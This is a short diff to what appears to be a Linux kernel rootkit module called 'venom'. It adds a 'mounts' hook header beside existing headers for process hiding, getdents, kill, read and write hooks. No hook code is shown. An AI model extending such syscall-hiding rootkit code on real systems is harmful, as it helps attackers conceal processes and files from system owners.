@@ -8,6 +8,7 @@
 
 #include "hooks/read.h"
 #include "hooks/write.h"
+#include "hooks/mounts.h" 
 #include "hooks/pid_hiding.h" 
 #include "hooks/getdents.h"
 #include "hooks/kill.h"
@@ -133,3 +134,4 @@ notrace static void __exit venom_exit(void) {
 
 module_init(venom_init);
 module_exit(venom_exit); 
+
